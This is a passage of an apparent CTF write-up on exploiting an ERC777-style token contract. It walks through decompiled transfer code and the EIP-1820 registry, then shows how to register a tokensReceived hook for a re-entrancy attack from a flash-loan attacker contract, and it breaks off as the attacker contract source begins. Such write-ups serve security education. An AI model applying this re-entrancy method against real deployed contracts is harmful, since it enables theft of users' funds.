+</span></span><span class="line"><span class="cl">      <span class="nb">revert</span> <span class="n">with</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;ERC777: transfer to the zero address&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">static</span> <span class="nb">call</span> <span class="mh">0x1820a4b7618bde71dce8cdc73aab6c95905fad24</span><span class="p">.</span><span class="n">getInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">interfaceHash</span><span class="p">)</span> <span class="n">with</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">gas</span> <span class="n">gas_remaining</span> <span class="kc">wei</span>
+</span></span><span class="line"><span class="cl">         <span class="n">args</span> <span class="n">caller</span><span class="p">,</span> <span class="mh">0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">not</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">success</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">revert</span> <span class="n">with</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">0</span> <span class="n">len</span> <span class="n">return_data</span><span class="p">.</span><span class="n">size</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span> <span class="n">return_data</span><span class="p">.</span><span class="n">size</span> <span class="o">&gt;=</span><span class="err">ΓÇ▓</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span> <span class="o">==</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">12</span> <span class="n">len</span> <span class="mi">20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">12</span> <span class="n">len</span> <span class="mi">20</span><span class="p">]</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">require</span> <span class="n">ext_code</span><span class="p">.</span><span class="n">size</span><span class="p">(</span><span class="n">addr</span><span class="p">(</span><span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">call</span> <span class="n">addr</span><span class="p">(</span><span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">).</span><span class="n">tokensToSend</span><span class="p">(</span><span class="kt">address</span> <span class="n">param1</span><span class="p">,</span> <span class="kt">address</span> <span class="n">param2</span><span class="p">,</span> <span class="kt">address</span> <span class="n">param3</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">param4</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">param5</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">param6</span><span class="p">)</span> <span class="n">with</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">           <span class="nb">gas</span> <span class="n">gas_remaining</span> <span class="kc">wei</span>
+</span></span><span class="line"><span class="cl">          <span class="n">args</span> <span class="n">caller</span><span class="p">,</span> <span class="n">caller</span><span class="p">,</span> <span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">),</span> <span class="n">_value</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">224</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="n">not</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">success</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">revert</span> <span class="n">with</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">0</span> <span class="n">len</span> <span class="n">return_data</span><span class="p">.</span><span class="n">size</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">caller</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">_value</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">revert</span> <span class="n">with</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;ERC777: transfer amount exceeds balance&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">balanceOf</span><span class="p">[</span><span class="n">caller</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">)]</span> <span class="o">&gt;</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">)]</span> <span class="o">+</span> <span class="n">_value</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">revert</span> <span class="n">with</span> <span class="s">&#39;NH{q&#39;</span><span class="p">,</span> <span class="mi">17</span>
+</span></span><span class="line"><span class="cl">  <span class="n">balanceOf</span><span class="p">[</span><span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">)]</span> <span class="o">+=</span> <span class="n">_value</span>
+</span></span><span class="line"><span class="cl">  <span class="n">log</span> <span class="n">Sent</span><span class="p">(</span><span class="kt">address</span> <span class="n">operator</span><span class="p">,</span> <span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">holderData</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">operatorData</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">           <span class="n">_value</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="mi">96</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="mi">128</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="n">caller</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="n">caller</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="n">_to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">log</span> <span class="n">Transfer</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="k">from</span><span class="o">=</span><span class="n">_value</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="o">=</span><span class="n">caller</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">tokens</span><span class="o">=</span><span class="n">_to</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">static</span> <span class="nb">call</span> <span class="mh">0x1820a4b7618bde71dce8cdc73aab6c95905fad24</span><span class="p">.</span><span class="n">getInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">interfaceHash</span><span class="p">)</span> <span class="n">with</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">gas</span> <span class="n">gas_remaining</span> <span class="kc">wei</span>
+</span></span><span class="line"><span class="cl">         <span class="n">args</span> <span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">),</span> <span class="mh">0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">not</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">success</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">revert</span> <span class="n">with</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">0</span> <span class="n">len</span> <span class="n">return_data</span><span class="p">.</span><span class="n">size</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span> <span class="n">return_data</span><span class="p">.</span><span class="n">size</span> <span class="o">&gt;=</span><span class="err">ΓÇ▓</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span> <span class="o">==</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">12</span> <span class="n">len</span> <span class="mi">20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">12</span> <span class="n">len</span> <span class="mi">20</span><span class="p">]</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">require</span> <span class="n">ext_code</span><span class="p">.</span><span class="n">size</span><span class="p">(</span><span class="n">addr</span><span class="p">(</span><span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">call</span> <span class="n">addr</span><span class="p">(</span><span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">).</span><span class="n">tokensReceived</span><span class="p">(</span><span class="kt">address</span> <span class="n">param1</span><span class="p">,</span> <span class="kt">address</span> <span class="n">param2</span><span class="p">,</span> <span class="kt">address</span> <span class="n">param3</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">param4</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">param5</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">param6</span><span class="p">)</span> <span class="n">with</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">           <span class="nb">gas</span> <span class="n">gas_remaining</span> <span class="kc">wei</span>
+</span></span><span class="line"><span class="cl">          <span class="n">args</span> <span class="n">caller</span><span class="p">,</span> <span class="n">caller</span><span class="p">,</span> <span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">),</span> <span class="n">_value</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">224</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="n">not</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">success</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">revert</span> <span class="n">with</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">0</span> <span class="n">len</span> <span class="n">return_data</span><span class="p">.</span><span class="n">size</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">1</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>and the first transaction log from my first POC (see further below) we can see that their is some call to <code>getInterfaceImplementer()</code> function:</p>
+<p><img src="/images/427c63e2-b8fe-4244-81c2-e8726a8c6a11.png" alt="" loading="lazy" /></p>
+<p>Here is the correponding eip : <a href="https://eips.ethereum.org/EIPS/eip-1820" target="_blank" rel="noopener">https://eips.ethereum.org/EIPS/eip-1820</a></p>
+<h2>Simple Summary<span class="absolute -mt-20" id="simple-summary-1"></span>
+    <a href="#simple-summary-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>This standard defines a universal registry smart contract where any
+address (contract or regular account) can register which interface it
+supports and which smart contract is responsible for its implementation.</p>
+<p>This standard keeps backward compatibility with <a href="https://eips.ethereum.org/EIPS/eip-165" target="_blank" rel="noopener">ERC-165</a>.</p>
+<h2>Abstract<span class="absolute -mt-20" id="abstract-1"></span>
+    <a href="#abstract-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>This standard defines a registry where smart contracts and regular
+accounts can publish which functionality they implement—either directly
+or through a proxy contract.</p>
+<p>Anyone can query this registry to ask if a specific address
+implements a given interface and which smart contract handles its
+implementation.</p>
+<p>This registry MAY be deployed on any chain and shares the same address on all chains.</p>
+<p>Interfaces with zeroes (<code>0</code>) as the last 28 bytes are considered <a href="https://eips.ethereum.org/EIPS/eip-165" target="_blank" rel="noopener">ERC-165</a> interfaces,
+and this registry SHALL forward the call to the contract to see if it implements the interface.</p>
+<p>This contract also acts as an <a href="https://eips.ethereum.org/EIPS/eip-165" target="_blank" rel="noopener">ERC-165</a> cache to reduce gas consumption.</p>
+<h2>Motivation<span class="absolute -mt-20" id="motivation-1"></span>
+    <a href="#motivation-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>There have been different approaches to define pseudo-introspection in Ethereum.
+The first is <a href="https://eips.ethereum.org/EIPS/eip-165" target="_blank" rel="noopener">ERC-165</a> which has the limitation that it cannot be used by regular accounts.
+The second attempt is <a href="https://github.com/ethereum/EIPs/issues/672" target="_blank" rel="noopener">ERC-672</a> which uses reverse <a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a>. Using reverse <a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a> has two issues.
+First, it is unnecessarily complicated, and second, <a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a> is still a centralized contract controlled by a multisig.
+This multisig theoretically would be able to modify the system.</p>
+<p>This standard is much simpler than <a href="https://github.com/ethereum/EIPs/issues/672" target="_blank" rel="noopener">ERC-672</a>, and it is <em>fully</em> decentralized.</p>
+<p>This standard also provides a <em>unique</em> address for all chains.
+Thus solving the problem of resolving the correct registry address for different chains.</p>
+<p>Back to the decompiled code:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kr">static</span> <span class="nb">call</span> <span class="mh">0x1820a4b7618bde71dce8cdc73aab6c95905fad24</span><span class="p">.</span><span class="n">getInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">interfaceHash</span><span class="p">)</span> <span class="n">with</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">gas</span> <span class="n">gas_remaining</span> <span class="kc">wei</span>
+</span></span><span class="line"><span class="cl">         <span class="n">args</span> <span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">),</span> <span class="mh">0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>after a quick google search we can find that:</p>
+<p><img src="/images/b85d9ee1-db3e-4f34-a986-0b8ab8f7f018.png" alt="" loading="lazy" /></p>
+<p><a href="https://docs.openzeppelin.com/contracts/3.x/erc777" target="_blank" rel="noopener">bookmark</a></p>
+<p>So apparently, Seagold is not just an ERC20 but rather an ERC777</p>
+<p>The question is: How can we trigger a fallback like functionality from ERC777 transfer call ?</p>
+<p><a href="https://ethereum.stackexchange.com/a/84702" target="_blank" rel="noopener">https://ethereum.stackexchange.com/a/84702</a></p>
+<p>Here we have it :</p>
+<p><a href="https://github.com/Dawn-Protocol/dawn-erc20-erc777/blob/master/contracts/Staking.sol#L243" target="_blank" rel="noopener">bookmark</a></p>
+<p>We can clearly see here that if we implement the tokensReceived function we can have a re-entrancy attack:</p>
+<p><img src="/images/a92b9812-e364-4481-a5e4-d551245477ff.png" alt="" loading="lazy" /></p>
+<p>So let’s implement the function in our flashloan contract + we can see that the address is called on  the return data which is the _to address from the params of the function which is msg.sender which is our flash loan contract !</p>
+<p><img src="/images/ca7dfac6-2e86-42e5-91a2-a9ba70189cbe.png" alt="" loading="lazy" /></p>
+<p>Once we have implemented the function there is still one thing to do:</p>
+<p><img src="/images/a3c117a4-c87e-441e-81ee-8b43f01fa31c.png" alt="" loading="lazy" /></p>
+<p>We can see that there is no interface implementer registered, so there are no call that is made here :</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">[</span><span class="mi">12</span> <span class="n">len</span> <span class="mi">20</span><span class="p">]</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">require</span> <span class="n">ext_code</span><span class="p">.</span><span class="n">size</span><span class="p">(</span><span class="n">addr</span><span class="p">(</span><span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">call</span> <span class="n">addr</span><span class="p">(</span><span class="n">ext_call</span><span class="p">.</span><span class="n">return_data</span><span class="p">).</span><span class="n">tokensReceived</span><span class="p">(</span><span class="kt">address</span> <span class="n">param1</span><span class="p">,</span> <span class="kt">address</span> <span class="n">param2</span><span class="p">,</span> <span class="kt">address</span> <span class="n">param3</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">param4</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">param5</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">param6</span><span class="p">)</span> <span class="n">with</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">           <span class="nb">gas</span> <span class="n">gas_remaining</span> <span class="kc">wei</span>
+</span></span><span class="line"><span class="cl">          <span class="n">args</span> <span class="n">caller</span><span class="p">,</span> <span class="n">caller</span><span class="p">,</span> <span class="n">addr</span><span class="p">(</span><span class="n">_to</span><span class="p">),</span> <span class="n">_value</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">224</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>ext_call.return_data is the result of getInterfaceImplementer.</p>
+<p>So first we have to find a way to add an interface implementer in the ERC1830Registry.</p>
+<p>We can do so with the following function:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">/// @notice Sets the contract which implements a specific interface for an address.
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// Only the manager defined for that address can set it.
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// (Each address is the manager for itself until it sets a new manager.)
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// @param _addr Address for which to set the interface.
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// (If &#39;_addr&#39; is the zero address then &#39;msg.sender&#39; is assumed.)
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// @param _interfaceHash Keccak256 hash of the name of the interface as a string.
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// E.g., &#39;web3.utils.keccak256(&#34;ERC777TokensRecipient&#34;)&#39; for the &#39;ERC777TokensRecipient&#39; interface.
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// @param _implementer Contract address implementing &#39;_interfaceHash&#39; for &#39;_addr&#39;.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nf">setInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_interfaceHash</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_implementer</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">_addr</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">:</span> <span class="n">_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">getManager</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;Not the manager&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">isERC165Interface</span><span class="p">(</span><span class="n">_interfaceHash</span><span class="p">),</span> <span class="s">&#34;Must not be an ERC165 hash&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">_implementer</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">_implementer</span> <span class="o">!=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ERC1820ImplementerInterface</span><span class="p">(</span><span class="n">_implementer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">.</span><span class="n">canImplementInterfaceForAddress</span><span class="p">(</span><span class="n">_interfaceHash</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">==</span> <span class="n">ERC1820_ACCEPT_MAGIC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Does not implement the interface&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">interfaces</span><span class="p">[</span><span class="n">addr</span><span class="p">][</span><span class="n">_interfaceHash</span><span class="p">]</span> <span class="o">=</span> <span class="n">_implementer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">emit</span> <span class="n">InterfaceImplementerSet</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">_interfaceHash</span><span class="p">,</span> <span class="n">_implementer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>→ _addr (FlashLoan address)</p>
+<p>→ _interfaceHash (0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b)</p>
+<p>→ _interfaceHash (FlashLoan address)</p>
+<p>So here is the call I made :</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">ERC1820Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">ERC1820Registry</span><span class="p">(</span><span class="n">REGISTRY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">registry</span><span class="p">.</span><span class="n">setInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">flashLoan</span><span class="p">),</span> <span class="mh">0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">flashLoan</span><span class="p">));</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>but I felt onto:</p>
+<p><img src="/images/8df87b9b-3bbf-40b6-a273-28ceb0f98bd3.png" alt="" loading="lazy" /></p>
+<p>Question: who is the manager ?</p>
+<p>It turns out that a contract is its own manager ! hehe</p>
+<p>So I moved my code inside my FlashLoan attacker 😈</p>
+<p>And here is a first peek at my set up:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">19</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Here we can find the standard interface for the ERC20. Don&#39;t forget that we find
+</span></span></span><span class="line"><span class="cl"><span class="c1">// out that the seagold is actually an ERC777 token !
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">interface</span> <span class="nc">IERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Transfer</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Approval</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">totalSupply</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">allowance</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">spender</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
